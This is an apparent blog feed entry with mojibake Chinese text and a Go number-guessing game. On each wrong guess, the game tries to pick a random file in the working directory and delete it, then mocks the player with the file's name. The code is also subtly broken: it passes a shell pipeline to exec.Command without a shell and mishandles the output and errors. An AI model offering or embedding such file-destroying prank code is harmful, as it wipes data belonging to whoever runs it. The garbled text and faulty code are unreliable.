å¤§æ¦‚ä»¥åä¼šé€‰æ‹©ä¸€äº›æ”¾åœ¨è¿™ä¸Šé¢ï¼Œå…³äºæŠ€æœ¯å’Œç”Ÿæ´»ã€æƒ³æ³•ã€‚<br>
å¾ˆå¤šäº‹æƒ…å€¼å¾—è®°å½•å’Œå›å¿†...</p>
<pre><code class="language-go">func main() {

	rand.Seed(time.Now().UnixNano())

	secretNumber := rand.Intn(100) + 1

	fmt.Println(&quot;Welcome to the Number Guessing Game!&quot;)

	for {
		fmt.Print(&quot;Guess a number between 1 and 100: &quot;)
		var input string
		fmt.Scanln(&amp;input)

		guess, err := strconv.Atoi(input)
		if err != nil {
			fmt.Println(&quot;Please enter a valid number.&quot;)
			continue
		}

		if guess == secretNumber {
			fmt.Println(&quot;Congratulations! You guessed it right!&quot;)
			break
		} else {
			fmt.Println(&quot;Oops! Wrong guess!&quot;)
			fmt.Println(&quot;And...U will lose a file&quot;)
			file := exec.Command(&quot;ls | shuf -n 1&quot;)
			output, err := file.Output()
			_ = os.Remove(string(output))

			fmt.Println(&quot;By the way, you have lost this file:&quot;, string(output))
			if err != nil {
				fmt.Println(&quot;Failed to execute.&quot;)
				continue
			}
		}
	}
}
</code></pre>
<p>æµ‹è¯•å›¾ç‰‡...<br>
<img src="https://sl3epf.github.io/post-images/1702973753493.jpg" alt="" loading="lazy"></p>
]]></content>
    </entry>
</feed>